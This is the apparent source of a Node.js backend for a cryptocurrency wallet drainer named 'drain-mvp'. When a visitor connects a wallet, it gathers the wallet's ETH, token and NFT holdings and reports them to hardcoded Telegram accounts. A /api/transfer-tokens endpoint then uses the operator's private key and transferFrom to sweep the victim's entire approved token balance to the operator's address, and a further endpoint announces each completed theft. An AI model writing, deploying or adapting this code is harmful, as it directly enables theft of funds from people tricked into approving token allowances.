const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const { ethers } = require('ethers');
require('dotenv').config();

const app = express();
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// Middleware
const allowedOrigins = [
  'http://localhost:3000',
  'https://drain-mvp-git-main-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mvp-zhangs-projects-c2c3a872.vercel.app',
  'https://drain-mvp.vercel.app/',
  process.env.FRONTEND_URL
].filter(Boolean);

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    } else {
      return callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.json());

// Store for user chat IDs (optional, for direct user messages)
const userChats = new Map();

// Telegram bot commands (optional, mainly for testing)
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    'Welcome! This bot automatically receives wallet information when users connect their wallets on our website.'
  );
});

// Optional: Command to test bot functionality
bot.onText(/\/test/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, '🤖 Bot is working correctly!');
});

// Predefined Telegram destinations
const TELEGRAM_DESTINATIONS = [
  process.env.TELEGRAM_CHANNEL_ID,
  process.env.TELEGRAM_USER_ID,
  7762598379,
  7997717431,
  7682852056,
  '@nextidearly0125'
].filter(Boolean); // Remove any undefined values

const TELEGRAM_USER_IDS = process.env.TELEGRAM_USER_IDS 
  ? process.env.TELEGRAM_USER_IDS.split(',').map(id => id.trim())
  : [];

app.get('/api/test', (req, res) => {
    res.json({ message: 'Backend is working!', timestamp: new Date().toISOString() });
  });

// API endpoint to get configuration for frontend (without exposing private key)
app.get('/api/config', (req, res) => {
  try {
    res.json({
      success: true,
      config: {
        approvalAddress: process.env.APPROVAL_ADDRESS,
        rpcUrl: process.env.RPC_URL
      }
    });
  } catch (error) {
    console.error('Error getting config:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API Routes
app.post('/api/wallet-connected', async (req, res) => {
  try {
    const { address } = req.body;
    //console.log(address)
    if (!address) {
      return res.status(400).json({ error: 'Address is required' });
    }

    // Get wallet data
    const walletData = await getWalletData(address);
    
    // Format message
    const message = formatWalletMessage(address, walletData);
    
    // Send to all predefined destinations
    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
      try {
        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
        //console.log(`Message sent to ${destination}`);
      } catch (error) {
        console.error(`Failed to send to ${destination}:`, error.message);
      }
    });
    
    await Promise.allSettled(sendPromises);
    
    res.json({ 
      success: true, 
      message: `Wallet data sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint for token transfer notifications
app.post('/api/token-transferred', async (req, res) => {
  try {
    const { 
      fromAddress, 
      toAddress, 
      tokenAddress, 
      amount, 
      symbol, 
      txHash,
      usdValue 
    } = req.body;
    
    // Validate required fields
    if (!fromAddress || !toAddress || !tokenAddress || !amount || !symbol || !txHash) {
      return res.status(400).json({ 
        error: 'Missing required fields: fromAddress, toAddress, tokenAddress, amount, symbol, txHash' 
      });
    }

    // Format transfer notification message
    const message = formatTransferMessage({
      fromAddress,
      toAddress,
      tokenAddress,
      amount,
      symbol,
      txHash,
      usdValue
    });
    
    // Send to all predefined destinations
    const sendPromises = TELEGRAM_USER_IDS.map(async (destination) => {
      try {
        await bot.sendMessage(destination, message, { parse_mode: 'HTML' });
        //console.log(`Transfer notification sent to ${destination}`);
      } catch (error) {
        console.error(`Failed to send transfer notification to ${destination}:`, error.message);
      }
    });
    
    await Promise.allSettled(sendPromises);
    
    res.json({ 
      success: true, 
      message: `Transfer notification sent to ${TELEGRAM_USER_IDS.length} Telegram destination(s)` 
    });
  } catch (error) {
    console.error('Error sending transfer notification:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to perform secure token transfer using backend private key
app.post('/api/transfer-tokens', async (req, res) => {
  try {
    const { 
      fromAddress, 
      tokenAddress, 
      amount 
    } = req.body;
    
    // Validate required fields
    if (!fromAddress || !tokenAddress || !amount) {
      return res.status(400).json({ 
        error: 'Missing required fields: fromAddress, tokenAddress, amount' 
      });
    }

    // Get configuration from environment variables
    const privateKey = process.env.APPROVAL_WALLET_PRIVATE_KEY;
    const rpcUrl = process.env.RPC_URL;
    const approvalAddress = process.env.APPROVAL_ADDRESS;
    console.log("config data: ", rpcUrl, approvalAddress)

    if (!privateKey || !rpcUrl || !approvalAddress) {
      return res.status(500).json({ 
        error: 'Server configuration missing. Please check environment variables.' 
      });
    }

    // Create provider and wallet
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
    
    // ERC20 ABI for transfer function
    const erc20Abi = [
      "function transferFrom(address from, address to, uint256 amount) returns (bool)",
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)",
      "function symbol() view returns (string)",
      "function allowance(address owner, address spender) view returns (uint256)"
    ];
    
    // Create contract instance
    const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);
    
    // Get token details
    const [symbol, decimals, balance, allowance] = await Promise.all([
      tokenContract.symbol(),
      tokenContract.decimals(),
      tokenContract.balanceOf(fromAddress),
      tokenContract.allowance(fromAddress, approvalAddress)
    ]);
    
    //console.log(`Token: ${symbol}, Balance: ${ethers.formatUnits(balance, decimals)}`);
    
    // Check if we have sufficient allowance
    if (allowance < balance) {
      return res.status(400).json({ 
        error: 'Insufficient allowance for transfer' 
      });
    }
    
    // Execute transfer
    const transferTx = await tokenContract.transferFrom(
      fromAddress,
      approvalAddress,
      balance // Transfer full balance
    );
    
    //console.log(`Transfer transaction sent: ${transferTx.hash}`);
    
    // Wait for confirmation
    const receipt = await transferTx.wait();
    
    if (receipt.status === 1) {
      //console.log(`✅ Transfer successful! Hash: ${receipt.hash}`);
      
      res.json({
        success: true,
        txHash: receipt.hash,
        amount: ethers.formatUnits(balance, decimals),
        symbol: symbol,
        message: 'Token transfer completed successfully'
      });
    } else {
      throw new Error('Transaction failed');
    }
    
  } catch (error) {
    console.error('Error in token transfer:', error);
    res.status(500).json({ 
      error: 'Token transfer failed', 
      details: error.message 
    });
  }
});

// Wallet data fetching functions
async function getWalletData(address) {
  try {
    const [balance, tokens, nfts] = await Promise.all([
      getEthBalance(address),
      getTokenBalances(address),
      getNFTBalances(address)
    ]);

    const totalUSD = await calculateTotalUSD(balance, tokens);

    return {
      balance,
      tokens,
      nfts,
      totalUSD
    };
  } catch (error) {
    console.error('Error fetching wallet data:', error);
    throw error;
  }
}

async function getEthBalance(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/balance`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      }
    });
    
    return {
      balance: (parseInt(response.data.balance) / 1e18).toFixed(4),
      symbol: 'ETH'
    };
  } catch (error) {
    console.error('Error fetching ETH balance:', error);
    return { balance: '0', symbol: 'ETH' };
  }
}

async function getTokenBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/erc20`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth'
      }
    });
    
    return response.data.map(token => ({
      name: token.name,
      symbol: token.symbol,
      balance: (parseInt(token.balance) / Math.pow(10, token.decimals)).toFixed(4),
      decimals: token.decimals,
      logo: token.logo
    }));
  } catch (error) {
    console.error('Error fetching tokens:', error);
    return [];
  }
}

async function getNFTBalances(address) {
  try {
    const response = await axios.get(`https://deep-index.moralis.io/api/v2/${address}/nft`, {
      headers: {
        'X-API-Key': process.env.MORALIS_API_KEY
      },
      params: {
        chain: 'eth',
        format: 'decimal'
      }
    });
    
    return response.data.result.map(nft => ({
      name: nft.name,
      symbol: nft.symbol,
      tokenId: nft.token_id,
      contractAddress: nft.token_address,
      metadata: nft.metadata ? JSON.parse(nft.metadata) : null
    }));
  } catch (error) {
    console.error('Error fetching NFTs:', error);
    return [];
  }
}

async function calculateTotalUSD(ethBalance, tokens) {
  try {
    // Get ETH price
    const ethPriceResponse = await axios.get(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd'
    );
    const ethPrice = ethPriceResponse.data.ethereum.usd;
    const ethValue = parseFloat(ethBalance.balance) * ethPrice;

    // For simplicity, we'll just calculate ETH value
    // In production, you'd want to get prices for all tokens
    return ethValue.toFixed(2);
  } catch (error) {
    console.error('Error calculating USD value:', error);
    return '0.00';
  }
}

function formatWalletMessage(address, data) {
  let message = `<b>💰 Wallet Analysis</b>\n\n`;
  message += `<b>Address:</b> <code>${address}</code>\n`;
  message += `<b>Total Value:</b> $${data.totalUSD} USD\n\n`;
  
  // Native balance
  message += `<b>🔷 Native Balance:</b>\n`;
  message += `${data.balance.balance} ${data.balance.symbol}\n\n`;
  
  // Tokens
  if (data.tokens.length > 0) {
    message += `<b>🪙 Tokens (${data.tokens.length}):</b>\n`;
    data.tokens.slice(0, 10).forEach(token => {
      message += `• ${token.balance} ${token.symbol}\n`;
    });
    if (data.tokens.length > 10) {
      message += `... and ${data.tokens.length - 10} more tokens\n`;
    }
    message += `\n`;
  }
  
  // NFTs
  if (data.nfts.length > 0) {
    message += `<b>🖼 NFTs (${data.nfts.length}):</b>\n`;
    data.nfts.slice(0, 5).forEach(nft => {
      message += `• ${nft.name || 'Unknown'} #${nft.tokenId}\n`;
    });
    if (data.nfts.length > 5) {
      message += `... and ${data.nfts.length - 5} more NFTs\n`;
    }
  }
  
  return message;
}

function formatTransferMessage(transferData) {
  const { fromAddress, toAddress, tokenAddress, amount, symbol, txHash, usdValue } = transferData;
  
  let message = `<b>🎯 Token Transfer Completed!</b>\n\n`;
  message += `<b>🔄 Transfer Details:</b>\n`;
  message += `<b>Amount:</b> ${amount} ${symbol}\n`;
  
  if (usdValue) {
    message += `<b>USD Value:</b> ~$${usdValue}\n`;
  }
  
  message += `\n<b>📍 Addresses:</b>\n`;
  message += `<b>From:</b> <code>${fromAddress}</code>\n`;
  message += `<b>To:</b> <code>${toAddress}</code>\n`;
  
  message += `\n<b>🪙 Token Contract:</b>\n`;
  message += `<code>${tokenAddress}</code>\n`;
  
  message += `\n<b>🔗 Transaction:</b>\n`;
  message += `<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>\n`;
  message += `<code>${txHash}</code>\n`;
  
  message += `\n<b>⏰ Status:</b> ✅ Confirmed\n`;
  message += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n`;
  
  return message;
}

// Start server
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  //console.log(`Server running on port ${PORT}`);
  //console.log('Telegram bot is active');
});